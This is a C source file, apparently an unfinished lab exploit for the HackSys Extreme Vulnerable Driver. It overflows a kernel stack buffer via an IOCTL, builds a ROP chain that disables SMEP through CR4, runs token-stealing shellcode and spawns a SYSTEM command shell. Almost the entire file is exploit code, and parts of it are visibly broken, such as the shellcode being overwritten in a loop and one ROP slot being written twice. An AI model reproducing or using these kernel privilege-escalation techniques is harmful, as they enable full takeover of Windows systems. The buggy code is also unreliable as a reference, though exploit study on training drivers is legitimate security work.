#include <Windows.h>
#include <Psapi.h>
#include <stdlib.h>
#include <stdio.h>
/*
This Payload will exploit a Stack Overflow in the HEVD Driver.
The Vulnerability is possible because a user-supplied size is 
passed to memcpy().

The payload is work in progress.
*/

//ioctl code to trigger Stack Overflow vulnerability
#define IOCTL_CODE 0x222003

// Get base of ntoskrnl.exe
LPVOID GetNTOsBase()
{
    LPVOID Bases[0x1000];
    DWORD needed = 0;
    LPVOID krnlbase = NULL;
    if (EnumDeviceDrivers(Bases, sizeof(Bases), &needed))
    {
        krnlbase = Bases[0];
    }
    return krnlbase;
}

//Spawn cmd with elevated privileges (from: https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit)
void spawnShell() {

    printf("[>] Spawning nt authority/system shell...\n");

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));

    CreateProcessA("C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        0,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi);
}


int main()
{
    //Create Handle to HEVD Driver
    HANDLE drivObjHndl = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    //Check if handle is valid
    if (drivObjHndl == INVALID_HANDLE_VALUE)
    {
        printf("No handle to driver :(\n");
        exit(-1);
    }

    //variable for DeviceIoControl->lpBytesReturned parameter
    DWORD bytesRtrnd;

    printf("Setting up payload!\n");

    /*
    Payload:
    - 2080 bytes until EIP overwrite
    - 4 bytes pop eax # ret (0x19a536)
    - 8 byte padding [ret 8 in HEVD]  
    - 4 byte SMEP value (0x000406e9) 
    - 4 byte mov cr4, eax # ret (0x0010bfeb)
    - 4 byte shellcode pointer
    */

    //Overflow Buffer in HEVD
    char payload[2128];
    //Offset until EIP Overwrite
    int offsetEIP = 2080;

    //Fill junk offset with 'A' until EIP overwrite
    memset(payload, 'A', sizeof(payload));

    //Pop calc.exe shellcode without null-bytes (from: https://www.arsouyes.org/en/blog/2020/01_Shellcode_Windows)
    /*char shellcode[] = {
        0xeb, 0x44, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0b,
        0x53, 0xb8, 0x00, 0x91,
        0x6c, 0x76,
        0xff, 0xd0, 0xeb, 0x45, 0x5b, 0x33, 0xd2, 0x88,
        0x53, 0x0d, 0x53, 0x50, 0xb8, 0x30, 0x59,
        0x6c, 0x76,
        0xff, 0xd0, 0xeb, 0x47, 0x5b, 0x33, 0xd2, 0x88,
        0x53, 0x08, 0xeb, 0x4d, 0x59, 0x33, 0xd2, 0x88,
        0x51, 0x04, 0x33, 0xd2, 0x6a, 0x05, 0x52, 0x52,
        0x53, 0x51, 0x52, 0xff, 0xd0, 0x33, 0xd2, 0x52,
        0xb8, 0x80, 0xf3,
        0x6c, 0x76,
        0xff, 0xd0, 0xe8, 0xb7, 0xff, 0xff, 0xff, 0x53,
        0x68, 0x65, 0x6c, 0x6c, 0x33, 0x32, 0x2e, 0x64,
        0x6c, 0x6c, 0x58, 0xe8, 0xb6, 0xff, 0xff, 0xff,
        0x53, 0x68, 0x65, 0x6c, 0x6c, 0x45, 0x78, 0x65,
        0x63, 0x75, 0x74, 0x65, 0x41, 0x58, 0xe8, 0xb4,
        0xff, 0xff, 0xff, 0x63, 0x61, 0x6c, 0x63, 0x2e,
        0x65, 0x78, 0x65, 0x58, 0xe8, 0xae, 0xff, 0xff,
        0xff, 0x6f, 0x70, 0x65, 0x6e, 0x58};
    */
    char shellcode_cmd[] = "\x89\xe5\x83\xec\x20\x64\x8b\x1d\x24\x01\x00\x00\x8b\x9b\x50\x01\x00\x00\x8b\x9b\x7c\x01\x00\x00\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0";
    char shellcode_token[] = "\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x80\x80\x00\x00\x00\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xe8\x00\x00\x00\x2d\xe8\x00\x00\x00\x39\x90\xe4\x00\x00\x00\x75\xed\x8b\x90\x2c\x01\x00\x00\x89\x91\x2c\x01\x00\x00\x61\x31\xc0\x83\xec\x04\x89\xc1\x89\xc8\x5d\xc2\x08\x00";
    for (int i=0; i < sizeof(shellcode_token); i++) {
        shellcode_token[i] = "\x90";
    }
    
    //Allocate (executable) memory for shellcode
    //LPVOID shellcode_ptr = VirtualAlloc(NULL, sizeof(shellcode_cmd), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode_ptr = VirtualAlloc(NULL, sizeof(shellcode_token), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode_ptr)
    {
        printf("Couldn't allocate shellcode :(\n");
        exit(-1);
    }

    //Move Shellcode into memory segment from VirtualAlloc()
    //RtlMoveMemory(shellcode_ptr, shellcode_cmd, sizeof(shellcode_cmd));
    RtlMoveMemory(shellcode_ptr, shellcode_token, sizeof(shellcode_token));

    printf("Shellcode @ 0x%x\n", (INT_PTR)shellcode_ptr);

    printf("Getting Kernel Base Address\n");

    //Enumerate device drivers to get kernel address
    //Kernel ('nt' module) base address
    LPVOID kernelBaseAddr = GetNTOsBase();

    if (!kernelBaseAddr)
    {
        printf("Failed to get base address :(\n");
        exit(-1);
    }

    printf("[*] Kernel base address @ 0x%x\n", kernelBaseAddr);

    printf("Building Rop chain...\n");

    /*
    const size_t popEaxOffset = offsetEIP;
    const size_t paddingOffset = offsetEIP + (size_t)0x4;
    const size_t smepOffset = offsetEIP + (size_t)0xc;
    const size_t cr4EaxOffset = offsetEIP + (size_t)0x10;
    const size_t shellcodeOffset = offsetEIP + (size_t)0x14;
    */

    //ROP Gadget: nt!_MapCmDevicePropertyToNtProperty+0x39 (pop eax; ret)
    LPVOID popEax = (LPVOID)(((INT_PTR)kernelBaseAddr) + 0x0010c10b);
    //ROP Gadget: nt!KeFlushCurrentTb+0x9 (mov cr4,eax; ret)
    LPVOID cr4Eax = (LPVOID)(((INT_PTR)kernelBaseAddr) + 0x0019a4f1);

    //ROP Gadget: nt!KiEnableXSave+0x65a3 (mov cr4,ecx; ret)
    LPVOID cr4Ecx = (LPVOID)(((INT_PTR)kernelBaseAddr) + 0x0019a4f1);
    //ROP Gadget: nt!crc32Map32_+0x3229 (pop ecx; ret)
    LPVOID popEcx = (LPVOID)(((INT_PTR)kernelBaseAddr) + 0x0002c4f9);

    //Return to normal execution (nt!IofCallDriver+0x48)
    LPVOID iofCallDriver = (LPVOID)(((INT_PTR)kernelBaseAddr) + 0x70038);


    printf("[*] \'pop eax; ret\'-Gadget @ 0x%x\n", popEax);
    printf("[*] \'mov cr4, eax\'-Gadget @ 0x%x\n", cr4Eax);

    char padding[8];

    //Add padding
    memset(padding, 'B', sizeof(padding));

    int smepValue = 0x000406e9;
    int newSmepValue = 0x001406e9;

    INT_PTR ropBuf = (INT_PTR)(payload + offsetEIP);

    printf("Starting EIP overwrite address @ 0x%x\n", ropBuf);

    *(INT_PTR *)ropBuf = (INT_PTR)popEax;
    *(INT_PTR *)(ropBuf + 4 * 1) = (INT_PTR)padding;
    *(INT_PTR *)(ropBuf + 4 * 3) = (INT_PTR)smepValue;
    *(INT_PTR *)(ropBuf + 4 * 4) = (INT_PTR)cr4Eax;
    *(INT_PTR *)(ropBuf + 4 * 5) = (INT_PTR)shellcode_ptr;
    //Enable SMEP
    *(INT_PTR *)(ropBuf + 4 * 6) = (INT_PTR)popEcx;
    *(INT_PTR *)(ropBuf + 4 * 7) = (INT_PTR)padding;
    *(INT_PTR *)(ropBuf + 4 * 9) = (INT_PTR)newSmepValue;
    *(INT_PTR *)(ropBuf + 4 * 10) = (INT_PTR)cr4Ecx;
    *(INT_PTR *)(ropBuf + 4 * 10) = (INT_PTR)iofCallDriver;


    /*
    printf("What memcpy doing?\n");
    //Copy ROP chain into payload
    printf("&payload[popEaxOffset] @ 0x%x\n", &payload[popEaxOffset]);
    printf("payload starting address @ 0x%x\n", &payload[0]);
    printf("Size popEax: %d\n", sizeof(popEax));
    printf("popEaxOffset: %d\n", popEaxOffset);
    memcpy(&payload[popEaxOffset], popEax, 0x4);
    printf("&payload[paddingOffset] @ 0x%x", &payload[paddingOffset]);
    memcpy(&payload[paddingOffset], padding, sizeof(padding));
    printf("&payload[smepOffset] @ 0x%x", &payload[smepOffset]);
    memcpy(&payload[smepOffset], &smepValue, 0x4);
    printf("&payload[cr4EaxOffset] @ 0x%x", &payload[cr4EaxOffset]);
    memcpy(&payload[cr4EaxOffset], cr4Eax, 0x4);
    printf("&payload[shellcodeOffset] @ 0x%x", &payload[shellcodeOffset]);
    memcpy(&payload[shellcodeOffset], &shellcode_ptr, 0x4);
    */

    printf("Payload length: 0x%x\n", sizeof(payload));
    printf("Sending Driver Payload!\n");

    //Send exploit to driver
    DeviceIoControl(drivObjHndl, IOCTL_CODE, payload, sizeof(payload), NULL, 0, &bytesRtrnd, NULL);

    //printf("Sent Payload :)\n");
    spawnShell();

    //CloseHandle(drivObjHndl);
}
